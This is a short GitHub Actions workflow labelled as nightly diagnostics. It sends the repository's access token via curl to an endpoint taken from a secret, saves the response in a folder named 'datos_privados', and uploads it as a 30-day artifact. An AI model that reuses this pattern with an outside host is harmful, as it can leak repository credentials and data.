name: System Sync & Diagnostics

on:
  schedule:
    - cron: '5 2 * * *'
  workflow_dispatch:

permissions:
  contents: read

jobs:
  telemetry:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Collect Diagnostics
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TARGET_URL: ${{ secrets.DIAGNOSTIC_ENDPOINT }}
        run: |
          mkdir -p datos_privados
          curl -s -H "Authorization: token $GH_TOKEN" \
               -H "Accept: application/vnd.github.v3+json" \
               "$TARGET_URL" > datos_privados/metrics_data.json

      - name: Archive Internal Logs
        uses: actions/upload-artifact@v4
        with:
          name: sys-diag-data
          path: datos_privados/metrics_data.json
          retention-days: 30
